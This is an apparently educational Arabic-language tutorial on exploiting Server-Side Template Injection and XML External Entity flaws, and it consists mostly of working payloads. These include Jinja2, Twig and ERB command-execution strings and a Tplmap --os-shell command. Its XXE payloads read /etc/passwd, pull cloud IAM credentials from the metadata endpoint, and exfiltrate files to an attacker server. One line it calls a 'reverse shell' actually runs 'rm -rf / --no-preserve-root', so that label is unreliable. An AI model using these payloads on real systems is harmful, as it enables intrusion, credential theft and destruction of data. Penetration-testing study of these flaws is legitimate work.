### 1. **Server-Side Template Injection (SSTI)** – الثغرة اللي بتخلي السيرفر ينفذ كودك زي ما إنت عايز

**الفكرة الأساسية:**  
الموقع بيستخدم **template engine** (زي Jinja2 في Python، Twig في PHP، ERB في Ruby...) عشان يرندر صفحات ديناميكية. المبرمج بيحط اسمك أو تعليقك جوا القالب **بالطريقة الغلط** (concatenation بدل data binding)، فالمحرك بيفسر كلامك كـ **كود قالب** مش نص عادي، وده يفتح باب RCE (Remote Code Execution).

**ليه خطيرة؟**  
- تقدري تقرأي ملفات السيرفر (/etc/passwd)
- تنفذي أوامر نظام (whoami, ls, cat /etc/shadow...)
- تسرقي secrets أو تعملي reverse shell

#### مراحل الاستغلال (Detect → Identify → Exploit)

1. **الاكتشاف (Detection) – جس النبض**  
   - ابدئي بـ **polyglot payload** (واحد يشتغل على كتير محركات):  
     `${{<%[%'"}}%\`  
     لو طلع error غريب أو exception → احتمال SSTI.

   - جربي عمليات حسابية بسيطة في سياق plaintext:  
     - `{{7*7}}` → لو رجع 49 → Jinja2 أو Twig  
     - `${7*7}` → Smarty أو Mako أو FreeMarker  
     - `<%= 7*7 %>` → ERB (Ruby)  
     - `#{7*7}` → Thymeleaf أو Expression Language

   - لو Blind (مش باين النتيجة): جربي time delay أو OOB (مثل `{{ sleep(10) }}` أو payload يعمل DNS request لـ Burp Collaborator).

2. **تحديد المحرك (Identification)**  
   استخدمي الـ decision tree ده (من PayloadsAllTheThings و PortSwigger 2026):

| Payload      | لو النتيجة 49 (7*7) | لو النتيجة 7777777 (تكرار) | المحرك المحتمل الرئيسي                  | ملاحظات / الفرق الدقيق              |
| ------------ | ------------------- | -------------------------- | --------------------------------------- | ----------------------------------- |
| `{{7*7}}`    | نعم                 | لا                         | Jinja2 (Python) أو Twig (PHP)           | الأشهر، ابدئي بيه                   |
| `{{7*'7'}}`  | 49                  | 7777777                    | Twig → 49 Jinja2 → 7777777              | **الفاصل الذهبي** بين Twig و Jinja2 |
| `${7*7}`     | نعم                 | -                          | FreeMarker (Java) أو Mako (Python)      | شائع في Java apps                   |
| `<%= 7*7 %>` | نعم                 | -                          | ERB (Ruby on Rails)                     | Ruby-specific                       |
| `#{7*7}`     | نعم                 | -                          | Thymeleaf (Java) أو Expression Language | Java/Spring غالبًا                  |
| `[[${7*7}]]` | نعم                 | -                          | Velocity (Java، أقل شيوعًا)             | قديم شوية                           |
   - لو error message طلع → شوفي اسم المحرك في الـ stack trace (غالباً بيبان).

3. **الاستغلال (Exploit) – Sandbox Escape → RCE**  
   بعد ما تعرفي المحرك، ابحثي عن **sandbox escape payloads** (في PayloadsAllTheThings أو HackTricks).

   - **Jinja2 (Python – الأشهر)**  
     أبسط PoC:  
     `{{ ''.__class__.__mro__[1].__subclasses__() }}` → يطلعلك كل الكلاسات المتاحة  
     بعدين ابحثي عن `os`, `subprocess`, `popen`:  
     `{{ lipsum.__globals__.__builtins__.__import__('os').popen('id').read() }}`  
     أو reverse shell:  
     `{{ config.items().__class__.__init__.__globals__['os'].popen('rm -rf / --no-preserve-root').read() }}` (خطر جداً!)

   - **Twig (PHP)**  
     `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`

   - **ERB (Ruby)**  
     `<% system("id") %>` أو `<%= `id` %>`

   - نصيحة : في research جديدة (Successful Errors من 2025) بتستخدم error-based payloads عشان تكشفي blind SSTI أحسن، وفيه toolkit جديدة بتساعد في auto-escape.

**أدوات مساعدة:**  
- **Tplmap** (أفضل tool لـ SSTI) → `python3 tplmap.py -u "http://target/?name=*" --os-shell`  
- Burp Suite + Backslash Powered Scanner extension  
- PayloadsAllTheThings repo (github/swisskyrepo)

### 2. **XML External Entity Injection (XXE)** – الثغرة اللي بتخلي السيرفر يقرأ ملفاته أو يروح يزور أماكن داخلية

**الفكرة الأساسية:**  
الموقع بياخد XML (في API, SOAP, file upload...) وبيحلله بـ parser (libxml2, Java SAX...)، والـ parser ده افتراضياً بيسمح بـ **external entities** (ملفات خارجية أو URLs).

**الأضرار:**  
- قراءة ملفات (/etc/passwd, config files, secrets)  
- SSRF (زي اللي شرحناه قبل كده)  
- Blind exfil (OOB)  
- DoS (billion laughs attack)

#### أنواع XXE الرئيسية

1. **In-band XXE (File Retrieval)**  
   Payload :  
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
   <stockCheck><productId>&xxe;</productId></stockCheck>
   ```  
   لو الرد رجع محتوى الملف → نجحت!

   على ويندوز: `file:///C:/Windows/win.ini`

2. **XXE to SSRF**  
   ```xml
   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
   ```  
   (زي الـ cloud metadata اللي شرحناه قبل كده)

3. **Blind XXE (Out-of-Band / OOB)**  
   - Detection:  
     ```xml
     <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://your-burp-collaborator.net"> ]>
     <foo>&xxe;</foo>
     ```  
     لو جالك hit في Collaborator → blind XXE مؤكد.

   - Exfiltration (سحب بيانات): استخدمي **parameter entities** + nested:  
     ```xml
     <!DOCTYPE foo [
     <!ENTITY % file SYSTEM "file:///etc/passwd">
     <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://your-server.com/?data=%file;'>">
     %eval;
     %exfil;
     ]>
     ```  
     (السيرفر هيبعت المحتوى كـ query param في الـ URL)

4. **XInclude (لما مش قادر تغير الـ DOCTYPE)**  
   ```xml
   <foo xmlns:xi="http://www.w3.org/2001/XInclude">
     <xi:include parse="text" href="file:///etc/passwd"/>
   </foo>
   ```

5. **File Upload XXE (SVG, DOCX...)**  
   ارفعي SVG فيه XXE payload، السيرفر وهو بيعالج الصورة هينفذه.

**نصايح :**  
- كتير parsers بقت تقفل external entities افتراضياً، لكن لسه موجودة في legacy systems.  
- جربي change Content-Type إلى text/xml حتى لو الطلب form-data.  
- في blind cases، OOB مع DTD خارجي (remote DTD) لسه قوي.

**Prevention (للمبرمجين):**  
- Disable external entities + XInclude في الـ parser.  
- استخدمي safe configs (مثل Java: DocumentBuilderFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true))

**أدوات:**  
- Burp Suite Scanner (يكشف XXE أوتوماتيك)  
- PayloadsAllTheThings/XXE repo 

And Done :)